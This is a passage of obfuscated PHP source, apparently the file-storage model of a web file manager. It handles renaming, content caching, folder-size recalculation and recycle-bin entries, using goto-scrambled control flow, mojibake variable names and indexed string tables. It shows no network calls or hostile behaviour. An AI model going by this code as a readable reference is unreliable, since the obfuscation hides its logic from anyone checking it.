Bèš£¤‚—î; D¯Ê•”Ë—µ: $DŠÁõ¥Ê‘ = $côôÉ£‚ƒ[2290] . $cğâ±Å÷Ï[$côôÉ£‚ƒ[457]]; if (isset(self::$cacheChildList[$DŠÁõ¥Ê‘])) { unset(self::$cacheChildList[$DŠÁõ¥Ê‘]); } return $DŸ±‡×Ş˜³; goto F‡øõ†À¢„; F‹¥š¼…°õ: if (!$cğâ±Å÷Ï[$côôÉ£‚ƒ[367]] == $côôÉ£‚ƒ[83]) { $Fá¬àÄâ‡¯[$côôÉ£‚ƒ[369]] = get_path_ext($fç½³¥ğÛŞ); } Model($côôÉ£‚ƒ[501])->eventRename($D˜»àß¯ë×, $cğâ±Å÷Ï[$côôÉ£‚ƒ[28]], $fç½³¥ğÛŞ); $this->sourceCacheClear($D˜»àß¯ë×); goto D‹äµ¨Ÿ¼š; FÉ¨ˆî…¼¢: $Dğ­Ë•ÉÅ = $this->fileNameExist($cğâ±Å÷Ï[$côôÉ£‚ƒ[457]], $fç½³¥ğÛŞ); if ($Dğ­Ë•ÉÅ) { return !1; } $Fá¬àÄâ‡¯ = array($côôÉ£‚ƒ[383] => $fç½³¥ğÛŞ, $côôÉ£‚ƒ[520] => USER_ID); goto F‹¥š¼…°õ; Bèš£¤‚—î: $côôÉ£‚ƒ =& $_SERVER[£ü]; $cğâ±Å÷Ï = $this->sourceInfo($D˜»àß¯ë×); if (!$cğâ±Å÷Ï) { return !1; } goto FÉ¨ˆî…¼¢; D‹äµ¨Ÿ¼š: $this->setNamePinyin($D˜»àß¯ë×, $Fá¬àÄâ‡¯[$côôÉ£‚ƒ[28]], !1); $this->updateModifyTime($cğâ±Å÷Ï[$côôÉ£‚ƒ[457]]); $DŸ±‡×Ş˜³ = $this->where(array($côôÉ£‚ƒ[380] => $D˜»àß¯ë×))->data($Fá¬àÄâ‡¯)->save(); goto D¯Ê•”Ë—µ; F‡øõ†À¢„: } public function setNamePinyin($f– ÖõÓ°•, $E Õö»¶¿, $fİÄ¼‡×ö = true) { $b‚¸¿ŒÒÖ² =& $_SERVER[£ü]; $cÔÄé²²ÓÏ = Input::check($E Õö»¶¿, $b‚¸¿ŒÒÖ²[524]); if ($fİÄ¼‡×ö && !$cÔÄé²²ÓÏ) { return; } if (!$cÔÄé²²ÓÏ) { $this->metaSet($f– ÖõÓ°•, $b‚¸¿ŒÒÖ²[412], null); $this->metaSet($f– ÖõÓ°•, $b‚¸¿ŒÒÖ²[411], null); return; } $f±•Šùç· = array($b‚¸¿ŒÒÖ²[412] => str_replace($b‚¸¿ŒÒÖ²[50], $b‚¸¿ŒÒÖ²[33], Pinyin::encode($E Õö»¶¿)), $b‚¸¿ŒÒÖ²[411] => Pinyin::encode($E Õö»¶¿, $b‚¸¿ŒÒÖ²[525])); $this->metaSet($f– ÖõÓ°•, $f±•Šùç·); } public function getContent($Fôƒíá¿¤) { goto C˜£Ëàœ¬; C˜£Ëàœ¬: $D‚–ÚÎ¯Ç³ =& $_SERVER[£ü]; $eï‡ìØÉŞé = $this->fileInfoGet($Fôƒíá¿¤); if (!$eï‡ìØÉŞé) { return !1; } goto b èÏßÕè«; b èÏßÕè«: if ($eï‡ìØÉŞé[$D‚–ÚÎ¯Ç³[77]] == 0) { return $D‚–ÚÎ¯Ç³[33]; } $f›ğ³Íòšˆ = $D‚–ÚÎ¯Ç³[2306] . $eï‡ìØÉŞé[$D‚–ÚÎ¯Ç³[160]]; if ($eï‡ìØÉŞé[$D‚–ÚÎ¯Ç³[77]] <= 1024 * 10) { $F„êÏŞ£“ø = Cache::get($f›ğ³Íòšˆ); if (!$F„êÏŞ£“ø) { $F„êÏŞ£“ø = IO::getContent($eï‡ìØÉŞé[$D‚–ÚÎ¯Ç³[75]]); Cache::set($f›ğ³Íòšˆ, $F„êÏŞ£“ø); } return $F„êÏŞ£“ø; } goto D¸áŠ˜ë…ô; D¸áŠ˜ë…ô: return IO::getContent($eï‡ìØÉŞé[$D‚–ÚÎ¯Ç³[75]]); goto fğŸ˜ó”š; fğŸ˜ó”š: } public function setDesc($aŸí…¢¼²†, $B‡ö Üº“æ) { $bÁõ£ÆŸ×Í =& $_SERVER[£ü]; Model($bÁõ£ÆŸ×Í[501])->eventAddDesc($aŸí…¢¼²†, $B‡ö Üº“æ); return $this->metaSet($aŸí…¢¼²†, $bÁõ£ÆŸ×Í[401], $B‡ö Üº“æ); } public function setContent($b”¾Ã¨²æ†, $cŠ‰¢ÒÆ¸¤ = '') { goto c×å†’Ú¡­; bÃ„Úµ¹¢§: if (!$C—£Ôô‹‘Ë) { return Model($dàÎŠ™²Ô[418])->remove($CÂŒÇÁÑ¨™[$dàÎŠ™²Ô[415]]); } $this->folderSizeReset($e¢‘»ïÊ‰[$dàÎŠ™²Ô[457]]); return !0; goto dÛÂ¾¨Şñ¥; c×å†’Ú¡­: $dàÎŠ™²Ô =& $_SERVER[£ü]; $e¢‘»ïÊ‰ = $this->sourceInfo($b”¾Ã¨²æ†); $bÚÃã¸õ£ = $this->fileInfoGet($b”¾Ã¨²æ†); goto f£İë…¨ï—; f£İë…¨ï—: if (!$bÚÃã¸õ£ || !$e¢‘»ïÊ‰) { return !1; } $CÂŒÇÁÑ¨™ = Model($dàÎŠ™²Ô[418])->addFileByContent($cŠ‰¢ÒÆ¸¤, $e¢‘»ïÊ‰[$dàÎŠ™²Ô[28]]); $C—£Ôô‹‘Ë = $this->fileHistory($e¢‘»ïÊ‰, $CÂŒÇÁÑ¨™[$dàÎŠ™²Ô[415]], $CÂŒÇÁÑ¨™[$dàÎŠ™²Ô[77]]); goto bÃ„Úµ¹¢§; dÛÂ¾¨Şñ¥: } public function fileSubstr($A›øÜğ¬ò, $Dß×š„ÉÏ, $Fã¡´Š‰») { $aŠÚ®¢Â„¶ = $this->fileInfoGet($A›øÜğ¬ò); if (!$aŠÚ®¢Â„¶) { return !1; } return IO::fileSubstr($aŠÚ®¢Â„¶[$_SERVER[£ü][75]], $Dß×š„ÉÏ, $Fã¡´Š‰»); } public function fileInfoGet($B°“°è«×·) { goto aÁ™ø¢ÌÍ; d²±Ô‰³‰í: $C³Ğ»¹§¥Ì = Model($B´Îù„ ĞÃ[418])->fileInfo($EÂŸ¶ïğ«”[$B´Îù„ ĞÃ[415]]); if ($C³Ğ»¹§¥Ì) { $C³Ğ»¹§¥Ì[$B´Îù„ ĞÃ[28]] = $EÂŸ¶ïğ«”[$B´Îù„ ĞÃ[28]]; } self::$cacheFileInfo[$A…åø¬«Ê‘] = $C³Ğ»¹§¥Ì; goto eéÛêè²Œø; aÁ™ø¢ÌÍ: $B´Îù„ ĞÃ =& $_SERVER[£ü]; $EÂŸ¶ïğ«” = $this->sourceInfo($B°“°è«×·); if (!$EÂŸ¶ïğ«” || $EÂŸ¶ïğ«”[$B´Îù„ ĞÃ[367]]) { return !1; } goto c¶÷ô»«; c¶÷ô»«: $A…åø¬«Ê‘ = $B´Îù„ ĞÃ[421] . $EÂŸ¶ïğ«”[$B´Îù„ ĞÃ[415]]; $fÖ«„ÃÄ…Ş = _get(self::$cacheFileInfo, $A…åø¬«Ê‘); if ($fÖ«„ÃÄ…Ş) { return $fÖ«„ÃÄ…Ş; } goto d²±Ô‰³‰í; eéÛêè²Œø: return $C³Ğ»¹§¥Ì; goto BÈÂßÙ¬‘ø; BÈÂßÙ¬‘ø: } private function folderChildrenNumber($A’íÉ®‹ö‡) { $dÖ“° åø„ =& $_SERVER[£ü]; $dçğĞê‚ÎÈ = $this->sourceInfo($A’íÉ®‹ö‡); $F…ˆ‘ÛÛÅ‚ = array($dÖ“° åø„[521] => array($dÖ“° åø„[479], $dçğĞê‚ÎÈ[$dÖ“° åø„[455]] . $A’íÉ®‹ö‡ . $dÖ“° åø„[480]), $dÖ“° åø„[392] => intval($dçğĞê‚ÎÈ[$dÖ“° åø„[393]]), $dÖ“° åø„[514] => 1); $DÛòÃ¨·–© = $this->where($F…ˆ‘ÛÛÅ‚)->count(); $E”à—¯«Ä“ = $this->where($F…ˆ‘ÛÛÅ‚)->where(array($dÖ“° åø„[514] => 0))->count(); return array($dÖ“° åø„[81] => $E”à—¯«Ä“, $dÖ“° åø„[82] => $DÛòÃ¨·–©); } public function pathInfo($bøŠ‰ö½Ûè, $B¥ŞÏø« = false) { goto dƒˆ’¯Êâƒ; A‹ÔÈÙğ®: if ($Cˆ¿¯£ÓÙ) { return $Cˆ¿¯£ÓÙ; } $CàÕï¥ğ‘´ = $this->sourceInfo($bøŠ‰ö½Ûè); if (!$CàÕï¥ğ‘´) { return !1; } goto e¼ŠÕ×ø¡; dƒˆ’¯Êâƒ: $c»ÏÔõ¯ =& $_SERVER[£ü]; $e²Æ‚²µé = $c»ÏÔõ¯[407] . intval($B¥ŞÏø«) . $c»ÏÔõ¯[408] . $bøŠ‰ö½Ûè; $Cˆ¿¯£ÓÙ = _get(self::$cachePathInfo, $e²Æ‚²µé); goto A‹ÔÈÙğ®; e¼ŠÕ×ø¡: $CàÕï¥ğ‘´ = $this->_listDataApplyItem($CàÕï¥ğ‘´, $B¥ŞÏø«); self::$cachePathInfo[$e²Æ‚²µé] = $CàÕï¥ğ‘´; return $CàÕï¥ğ‘´; goto a…Şîã–ª“; a…Şîã–ª“: } public static $cachePathInfoMore = array(); public function pathInfoMore($b§¼º²ŸÏÏ) { goto fÑ£®‚Õİê; fÑ£®‚Õİê: $b¢½ëØ¤ÇÛ =& $_SERVER[£ü]; $bÉÚŠù ¢ = _get(self::$cachePathInfoMore, $b§¼º²ŸÏÏ); if ($bÉÚŠù ¢) { return $bÉÚŠù ¢; } goto B°Ñ§Ã‰áô; B°Ñ§Ã‰áô: $b¯ëŞÀ°ÆŞ = $this->pathInfo($b§¼º²ŸÏÏ); if (!$b¯ëŞÀ°ÆŞ) { return !1; } if ($b¯ëŞÀ°ÆŞ[$b¢½ëØ¤ÇÛ[367]] == $b¢½ëØ¤ÇÛ[83]) { $b¯ëŞÀ°ÆŞ[$b¢½ëØ¤ÇÛ[80]] = $this->folderChildrenNumber($b§¼º²ŸÏÏ); } goto e°¹İ¾¸Ğâ; e°¹İ¾¸Ğâ: self::$cachePathInfoMore[$b§¼º²ŸÏÏ] = $b¯ëŞÀ°ÆŞ; return $b¯ëŞÀ°ÆŞ; goto c¥¹É×—ÎÇ; c¥¹É×—ÎÇ: } public function sourceInfo($FªİÀ¡Ëê) { goto fÏª¦æÙíÌ; fÏª¦æÙíÌ: $c‡åŒĞ¿ =& $_SERVER[£ü]; if (!$FªİÀ¡Ëê) { return array(); } $d®áÎ®òö¨ = $c‡åŒĞ¿[406] . $FªİÀ¡Ëê; goto bä–…ßÖñò; bä–…ßÖñò: $a¯Ù¹§ÕÏ = _get(self::$cacheSourceInfo, $d®áÎ®òö¨); if ($a¯Ù¹§ÕÏ) { return $a¯Ù¹§ÕÏ; } $B¯Ûğßäë¢ = $this->where(array($c‡åŒĞ¿[366] => $FªİÀ¡Ëê))->find(); goto FİšÕ°»¦; FİšÕ°»¦: self::$cacheSourceInfo[$d®áÎ®òö¨] = $B¯Ûğßäë¢; return self::$cacheSourceInfo[$d®áÎ®òö¨]; goto b×¼÷å¡›õ; b×¼÷å¡›õ: } public function sourceCacheClear($E¾¹µŞÃ¹¸ = false) { if ($E¾¹µŞÃ¹¸ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[£ü][406] . $E¾¹µŞÃ¹¸]); } public function pathInfoByPath($b‘µ¨‹™Éç, $aà†Ğ—Âƒ) { $BÍ½àô’±¯ =& $_SERVER[£ü]; $dÊ—Ì—ä = !$aà†Ğ—Âƒ ? array() : explode($BÍ½àô’±¯[8], trim($aà†Ğ—Âƒ, $BÍ½àô’±¯[8])); $Fì‚ÙÂ¬…‹ = $b‘µ¨‹™Éç; foreach ($dÊ—Ì—ä as $a†ºíØ‡ˆº) { $d×Ø³ÍÚƒ = array($BÍ½àô’±¯[457] => $Fì‚ÙÂ¬…‹, $BÍ½àô’±¯[28] => $a†ºíØ‡ˆº); $cÚŸĞš×§¥ = $this->where($d×Ø³ÍÚƒ)->select(); if (!$cÚŸĞš×§¥) { return !1; } $cÚŸĞš×§¥ = array_sort_by($cÚŸĞš×§¥, $BÍ½àô’±¯[393]); $Fì‚ÙÂ¬…‹ = $cÚŸĞš×§¥[0][$BÍ½àô’±¯[366]]; } return $this->pathInfo($Fì‚ÙÂ¬…‹, !0); } protected function updateModifyTime($dè»áÀ«­) { goto CÎÛ¡åÂöÇ; aëÒâ´ÀñÈ: $this->where($F¬îµÇÃñ¦)->save($FÎÄ¨©”´Ü); goto DôÂ‹åÑç; CÎÛ¡åÂöÇ: $BÕÓ´õªîâ =& $_SERVER[£ü]; if (!$dè»áÀ«­) { return; } if (!is_array($dè»áÀ«­)) { $dè»áÀ«­ = array($dè»áÀ«­); } goto AÂù¶ŸÈ; AÂù¶ŸÈ: foreach ($dè»áÀ«­ as $b®¤íí => $Cˆ²Œ‹Òà²) { $dè»áÀ«­[$b®¤íí] = intval($Cˆ²Œ‹Òà²); } $F¬îµÇÃñ¦ = array($BÕÓ´õªîâ[366] => array($BÕÓ´õªîâ[7], $dè»áÀ«­)); $FÎÄ¨©”´Ü = array($BÕÓ´õªîâ[520] => USER_ID, $BÕÓ´õªîâ[387] => time()); goto aëÒâ´ÀñÈ; DôÂ‹åÑç: } public function folderSizeReset($CñÂÏ»Š»ù) { goto fá¬±¹†Çµ; Dƒˆ¼ƒ·¨: $c——¼ª‹ŠÀ = array($aáµİ±ê¥Å[365] => $CñÂÏ»Š»ù, $aáµİ±ê¥Å[392] => 0); $A»„«Ø³ŠÀ = $this->where($c——¼ª‹ŠÀ)->sum($aáµİ±ê¥Å[77]); $A»„«Ø³ŠÀ = intval($A»„«Ø³ŠÀ); goto BÏ­¬˜Œ´Ó; BÏ­¬˜Œ´Ó: $b§–¾áª® = $A»„«Ø³ŠÀ - intval($a»½ï­êÂ[$aáµİ±ê¥Å[77]]); if ($b§–¾áª® == 0) { return CacheLock::unlock($dÇà–¾Ú¼¼); } $this->where(array($aáµİ±ê¥Å[380] => $CñÂÏ»Š»ù))->setField($aáµİ±ê¥Å[77], $A»„«Ø³ŠÀ); goto eÆ¥æÕ½¢; eÆ¥æÕ½¢: $E·¤Ø¡ó¹é = $this->parentLevelArray($a»½ï­êÂ[$aáµİ±ê¥Å[455]]); if ($E·¤Ø¡ó¹é) { $c——¼ª‹ŠÀ = array($aáµİ±ê¥Å[366] => array($aáµİ±ê¥Å[381], $E·¤Ø¡ó¹é)); if ($b§–¾áª® < 0) { $c——¼ª‹ŠÀ[$aáµİ±ê¥Å[77]] = array($aáµİ±ê¥Å[919], abs($b§–¾áª®)); } $this->where($c——¼ª‹ŠÀ)->setAdd($aáµİ±ê¥Å[77], $b§–¾áª®); } $this->targetSpaceUpdate($a»½ï­êÂ[$aáµİ±ê¥Å[368]], $a»½ï­êÂ[$aáµİ±ê¥Å[452]]); goto f‘­±¾­íï; f‘­±¾­íï: CacheLock::unlock($dÇà–¾Ú¼¼); goto AáÄ„Œ™ç‡; DİùÜÒÈËè: CacheLock::lock($dÇà–¾Ú¼¼, 20); $this->sourceCacheClear($CñÂÏ»Š»ù); $a»½ï­êÂ = $this->sourceInfo($CñÂÏ»Š»ù); goto Dƒˆ¼ƒ·¨; fá¬±¹†Çµ: $aáµİ±ê¥Å =& $_SERVER[£ü]; if ($this->statusIgnoreResetSpace) { return; } $dÇà–¾Ú¼¼ = $aáµİ±ê¥Å[2307] . $CñÂÏ»Š»ù; goto DİùÜÒÈËè; AáÄ„Œ™ç‡: } public function folderSizeResetChildren($f»íŒÖ†) { goto BÚ‚ï½Ã™ã; EÃ·¼¼ĞâÒ: $e‚İ„™—›·[$E„‰­Š‚éâ[367]] = 0; $A‹âÊä»ä = $this->field($E§‹‚¤ß’›)->where($e‚İ„™—›·)->select(); if (!$A‹âÊä»ä) { return; } goto CÒÒôôŒ; f®ºØÆ«: $e‚İ„™—›· = array($E„‰­Š‚éâ[514] => 1, $E„‰­Š‚éâ[521] => array($E„‰­Š‚éâ[479], $B®Êî×Èö˜[$E„‰­Š‚éâ[455]] . $f»íŒÖ† . $E„‰­Š‚éâ[480])); $E§‹‚¤ß’› = $E„‰­Š‚éâ[2308]; $d¹›å™®·Ê = $this->field($E§‹‚¤ß’›)->where($e‚İ„™—›·)->select(); goto EÃ·¼¼ĞâÒ; Eğ®ÊÎİßÉ: foreach ($A‹âÊä»ä as $E÷Êåœ®©Î) { $FÆ‚ï‰ÌÍ© = $E÷Êåœ®©Î[$E„‰­Š‚éâ[457]] . $E„‰­Š‚éâ[33]; if (!isset($d¹›å™®·Ê[$FÆ‚ï‰ÌÍ©])) { continue; } if ($E÷Êåœ®©Î[$E„‰­Š‚éâ[393]] == $d¹›å™®·Ê[$FÆ‚ï‰ÌÍ©][$E„‰­Š‚éâ[393]]) { $d¹›å™®·Ê[$FÆ‚ï‰ÌÍ©][$E„‰­Š‚éâ[77]] += $E÷Êåœ®©Î[$E„‰­Š‚éâ[77]]; } } foreach ($d¹›å™®·Ê as $E÷Êåœ®©Î) { $eŞ¢Ñ£”ƒÑ = $this->parentLevelArray($E÷Êåœ®©Î[$E„‰­Š‚éâ[455]]); foreach ($eŞ¢Ñ£”ƒÑ as $FÆ‚ï‰ÌÍ©) { $FÆ‚ï‰ÌÍ© = $FÆ‚ï‰ÌÍ© . $E„‰­Š‚éâ[33]; if (!isset($d¹›å™®·Ê[$FÆ‚ï‰ÌÍ©])) { continue; } if ($E÷Êåœ®©Î[$E„‰­Š‚éâ[393]] == $d¹›å™®·Ê[$FÆ‚ï‰ÌÍ©][$E„‰­Š‚éâ[393]]) { $d¹›å™®·Ê[$FÆ‚ï‰ÌÍ©][$E„‰­Š‚éâ[77]] += $E÷Êåœ®©Î[$E„‰­Š‚éâ[77]]; } } } $bÅö¦„Õ = array(); goto a¹Ò‰Å´‘Ü; BÚ‚ï½Ã™ã: $E„‰­Š‚éâ =& $_SERVER[£ü]; $this->sourceCacheClear($f»íŒÖ†); $B®Êî×Èö˜ = $this->sourceInfo($f»íŒÖ†); goto f®ºØÆ«; CÒÒôôŒ: $d¹›å™®·Ê[] = $B®Êî×Èö˜; $d¹›å™®·Ê = array_to_keyvalue($d¹›å™®·Ê, $E„‰­Š‚éâ[366]); foreach ($d¹›å™®·Ê as $E­‡²…šËƒ => $E÷Êåœ®©Î) { $d¹›å™®·Ê[$E­‡²…šËƒ][$E„‰­Š‚éâ[2309]] = $d¹›å™®·Ê[$E­‡²…šËƒ][$E„‰­Š‚éâ[77]]; $d¹›å™®·Ê[$E­‡²…šËƒ][$E„‰­Š‚éâ[77]] = 0; } goto Eğ®ÊÎİßÉ; a¹Ò‰Å´‘Ü: foreach ($d¹›å™®·Ê as $E÷Êåœ®©Î) { if ($E÷Êåœ®©Î[$E„‰­Š‚éâ[77]] == $E÷Êåœ®©Î[$E„‰­Š‚éâ[2309]]) { continue; } $bÅö¦„Õ[] = array($E„‰­Š‚éâ[366], $E÷Êåœ®©Î[$E„‰­Š‚éâ[366]], $E„‰­Š‚éâ[77], $E÷Êåœ®©Î[$E„‰­Š‚éâ[77]]); } $this->saveAll($bÅö¦„Õ); goto a”æ°‘…Ôó; a”æ°‘…Ôó: } public function userSpaceReset($bë¸íï÷ùõ = false) { $DÛˆŸ›Óí§ =& $_SERVER[£ü]; $D†…ÒîÁÒ = $this->where(array($DÛˆŸ›Óí§[368] => self::TYPE_USER, $DÛˆŸ›Óí§[452] => $bë¸íï÷ùõ, $DÛˆŸ›Óí§[367] => 0))->sum($DÛˆŸ›Óí§[77]); Model($DÛˆŸ›Óí§[470])->userEdit($bë¸íï÷ùõ, array($DÛˆŸ›Óí§[2050] => $D†…ÒîÁÒ)); } public function targetSpaceUpdate($fŒ‚Ÿ¬ö±Ó, $F–Ì•®øô×) { $A¼¯õÊ =& $_SERVER[£ü]; if (!$F–Ì•®øô×) { return; } if (!in_array($fŒ‚Ÿ¬ö±Ó, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $d’ÓÌ‡±·¥ = $this->targetSpaceSize($fŒ‚Ÿ¬ö±Ó, $F–Ì•®øô×); if ($fŒ‚Ÿ¬ö±Ó == self::TYPE_USER) { Model($A¼¯õÊ[470])->userEdit($F–Ì•®øô×, array($A¼¯õÊ[2050] => $d’ÓÌ‡±·¥)); } else { if ($fŒ‚Ÿ¬ö±Ó == self::TYPE_GROUP) { Model($A¼¯õÊ[454])->groupEdit($F–Ì•®øô×, array($A¼¯õÊ[2050] => $d’ÓÌ‡±·¥)); } } } public function targetSpaceSize($aé÷¢‘éã´, $AÁÚºŒÁó) { goto eÉŠØÌÔàî; cËƒ‹åĞêç: return $B‘™ÇØµªĞ; goto cæÉÓ’„ì‡; eÉŠØÌÔàî: $e¶éğ¤¡Á =& $_SERVER[£ü]; $F‹“Óˆâ½à = $this->sourceRoot($aé÷¢‘éã´, $AÁÚºŒÁó, !0); if (!$F‹“Óˆâ½à) { return 0; } goto EÀì¯ÜÃ¯Î; EÀì¯ÜÃ¯Î: $B‘™ÇØµªĞ = floatval($F‹“Óˆâ½à[$e¶éğ¤¡Á[77]]); $eçïİÅ“Á = array($e¶éğ¤¡Á[521] => array($e¶éğ¤¡Á[479], $e¶éğ¤¡Á[466] . $F‹“Óˆâ½à[$e¶éğ¤¡Á[366]] . $e¶éğ¤¡Á[480])); $C†÷–Ë†­â = Model($e¶éğ¤¡Á[391])->field($e¶éğ¤¡Á[380])->where($eçïİÅ“Á)->select(); goto B˜«å†ÍšÍ; B˜«å†ÍšÍ: $C†÷–Ë†­â = array_to_keyvalue($C†÷–Ë†­â, $e¶éğ¤¡Á[33], $e¶éğ¤¡Á[366]); $C†÷–Ë†­â = array_unique(array_filter($C†÷–Ë†­â)); if ($C†÷–Ë†­â) { $eçïİÅ“Á = array($e¶éğ¤¡Á[380] => array($e¶éğ¤¡Á[381], $C†÷–Ë†­â)); $B‘™ÇØµªĞ += floatval($this->where($eçïİÅ“Á)->sum($e¶éğ¤¡Á[77])); } goto cËƒ‹åĞêç; cæÉÓ’„ì‡: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($B´ÖÒ®ùÚÊ) { return $this->fileTypeProfile($B´ÖÒ®ùÚÊ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($Eõİ­¥×“Ö) { return $this->fileTypeProfile($Eõİ­¥×“Ö, SourceModel::TYPE_GROUP); } private function fileTypeProfile($dôÁââß¬, $B‹È­ôË»ˆ) { goto FÀ†ÑÖºâ; FÀ†ÑÖºâ: $b—„¨ä­ =& $_SERVER[£ü]; $B‘ƒÑ÷¼ = $b—„¨ä­[2310] . $dôÁââß¬ . $b—„¨ä­[70] . $B‹È­ôË»ˆ; $d¿Îäˆ½‚Ä = Cache::get($B‘ƒÑ÷¼); goto Aâ¦é»èÏ; Aâ¦é»èÏ: if ($d¿Îäˆ½‚Ä) { return $d¿Îäˆ½‚Ä; } $a·Š®ÏÃ«¶ = array($b—„¨ä­[514] => 0); if ($dôÁââß¬ != !1) { $a·Š®ÏÃ«¶[$b—„¨ä­[452]] = $dôÁââß¬; $a·Š®ÏÃ«¶[$b—„¨ä­[368]] = $B‹È­ôË»ˆ; } goto a¿˜‘ÌĞÅ¸; a¿˜‘ÌĞÅ¸: $Fø£‡ôä = array(); $Fø£‡ôä[$b—„¨ä­[2311]] = array($b—„¨ä­[2312] => LNG($b—„¨ä­[2311]), $b—„¨ä­[2313] => $this->where($a·Š®ÏÃ«¶)->count(), $b—„¨ä­[516] => $this->where($a·Š®ÏÃ«¶)->sum($b—„¨ä­[77])); $DŠ¬ø÷õœ× = KodIO::fileTypeList(); goto F¿ËÌ‹ù‰²; F¿ËÌ‹ù‰²: foreach ($DŠ¬ø÷õœ× as $EœÅ‡–×Å¢ => $EŠÍíÉ‡¿) { $a·Š®ÏÃ«¶[$b—„¨ä­[369]] = $this->fileTypeWhere($EœÅ‡–×Å¢); $Fø£‡ôä[$EœÅ‡–×Å¢] = array($b—„¨ä­[2312] => $EŠÍíÉ‡¿[$b—„¨ä­[28]], $b—„¨ä­[2313] => $this->where($a·Š®ÏÃ«¶)->count(), $b—„¨ä­[516] => $this->where($a·Š®ÏÃ«¶)->sum($b—„¨ä­[77])); } Cache::set($B‘ƒÑ÷¼, $Fø£‡ôä, 1200); return $Fø£‡ôä; goto AĞ‹‰·´„; AĞ‹‰·´„: } public function fileNameExist($BŒÚ½‘ÑŞÛ, $dµÕÁ¤»Ç÷) { $Eç”Ø ÌßÁ =& $_SERVER[£ü]; $a‰à”º­ÌÕ = $this->childList($BŒÚ½‘ÑŞÛ); foreach ($a‰à”º­ÌÕ as $D«õÈó¡§) { if ($D«õÈó¡§[$Eç”Ø ÌßÁ[28]] == $dµÕÁ¤»Ç÷) { return $D«õÈó¡§[$Eç”Ø ÌßÁ[366]]; } } return !1; } public function childList($CĞ„ÓŸÂ) { goto bÈŞ¦ƒƒ å; bÈŞ¦ƒƒ å: $açËÎé¤‚ =& $_SERVER[£ü]; $Fø§ŒåŸÖ = $açËÎé¤‚[2290] . $CĞ„ÓŸÂ; if (isset(self::$cacheChildList[$Fø§ŒåŸÖ])) { return self::$cacheChildList[$Fø§ŒåŸÖ]; } goto dä›£™ËÄ; bÚŠ¿®–Ëî: self::$cacheChildList[$Fø§ŒåŸÖ] = $F«Äè©¸ä; foreach ($F«Äè©¸ä as $EÁƒ¾™‚šŒ) { $Fø§ŒåŸÖ = $açËÎé¤‚[406] . $EÁƒ¾™‚šŒ[$açËÎé¤‚[366]]; self::$cacheSourceInfo[$Fø§ŒåŸÖ] = $EÁƒ¾™‚šŒ; } return $F«Äè©¸ä; goto BÖ“«ˆï²Å; dä›£™ËÄ: $B†ƒŸ¬½çÆ = array($açËÎé¤‚[457] => intval($CĞ„ÓŸÂ), $açËÎé¤‚[393] => 0); $F«Äè©¸ä = $this->where($B†ƒŸ¬½çÆ)->select(); $F«Äè©¸ä = $F«Äè©¸ä ? $F«Äè©¸ä : array(); goto bÚŠ¿®–Ëî; BÖ“«ˆï²Å: } public function fileNameAuto($Dô›ğÀˆ´Ç, $bÄùù•š , $B‡‰ö¡¬ùö = REPEAT_RENAME, $FÙ— Å†÷¸ = false) { $Cİ´õ°³ß =& $_SERVER[£ü]; $e¦àëŠ¯ìî = $this->childList($Dô›ğÀˆ´Ç); $Fì¯¬ŒÒÖ± = array_to_keyvalue($e¦àëŠ¯ìî, $Cİ´õ°³ß[33], $Cİ´õ°³ß[28]); return $this->fileNameAutoGet($Fì¯¬ŒÒÖ±, $bÄùù•š , $B‡‰ö¡¬ùö, $FÙ— Å†÷¸); } public function fileNameAutoGet($bÓ³’¦¡×”, $aÇ‹¢¤ìë, $Cåßµ‡İÉò, $CÊ”­…Ï×) { $A…™Á‡²¥˜ =& $_SERVER[£ü]; if ($Cåßµ‡İÉò == REPEAT_REPLACE || !$bÓ³’¦¡×” || !in_array_not_case($aÇ‹¢¤ìë, $bÓ³’¦¡×”) || $CÊ”­…Ï× && $Cåßµ‡İÉò != REPEAT_RENAME_FOLDER) { return $aÇ‹¢¤ìë; } if ($Cåßµ‡İÉò == REPEAT_SKIP) { return !1; } $CøÚ–•ä‡À = $A…™Á‡²¥˜[93] . get_path_ext($aÇ‹¢¤ìë); $CøÚ–•ä‡À = $CøÚ–•ä‡À == $A…™Á‡²¥˜[93] || $CÊ”­…Ï× ? $A…™Á‡²¥˜[33] : $CøÚ–•ä‡À; for ($aËàëÓŞ¥ = 1; $aËàëÓŞ¥ <= count($bÓ³’¦¡×”) + 1; $aËàëÓŞ¥++) { $bŞ‚ä­™ŸË = substr($aÇ‹¢¤ìë, 0, strlen($aÇ‹¢¤ìë) - strlen($CøÚ–•ä‡À)); $Eõ¨°„µò = $bŞ‚ä­™ŸË . "\50{$aËàëÓŞ¥}\51{$CøÚ–•ä‡À}"; if (!in_array_not_case($Eõ¨°„µò, $bÓ³’¦¡×”)) { return $Eõ¨°„µò; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\x5f\163\x6f\x75\x72\x63\145\137\x72\145\143\x79\143\x6c\x65"; protected $dataAuto = array(array("\143\162\145\141\164\x65\124\x69\x6d\x65", "\164\x69\x6d\x65", "\x69\156\163\x65\x72\164", "\146\165\x6e\x63\x74\x69\157\156")); public function listData($dÕ‡­Äà = false) { $Bà—‹š¨À =& $_SERVER[£ü]; $dÕ‡­Äà = $dÕ‡­Äà ? $dÕ‡­Äà : USER_ID; $DÑÏ·Ûš¾‡ = $this->where(array($Bà—‹š¨À[1392] => $dÕ‡­Äà))->select(); return array_to_keyvalue($DÑÏ·Ûš¾‡, $Bà—‹š¨À[33], $Bà—‹š¨À[366]); } public function moveToRecycle($DØ¡ˆ»ËŞƒ) { goto bÙ†×ÍËˆİ; eÎÙ‹Á‘: if (!$aŒ­Ìïù¼Å || $aŒ­Ìïù¼Å[$aÖÂ†ƒ…Œ‘[393]] == $aÖÂ†ƒ…Œ‘[83]) { return; } $e—ÚÏ·Ü·« = array($aÖÂ†ƒ…Œ‘[380] => $DØ¡ˆ»ËŞƒ, $aÖÂ†ƒ…Œ‘[1392] => USER_ID, $aÖÂ†ƒ…Œ‘[517] => $aŒ­Ìïù¼Å[$aÖÂ†ƒ…Œ‘[368]], $aÖÂ†ƒ…Œ‘[518] => $aŒ­Ìïù¼Å[$aÖÂ†ƒ…Œ‘[452]], $aÖÂ†ƒ…Œ‘[521] => $aŒ­Ìïù¼Å[$aÖÂ†ƒ…Œ‘[455]]); $this->add($e—ÚÏ·Ü·«); goto f†ÉçÁ°ß½; bÙ†×ÍËˆİ: 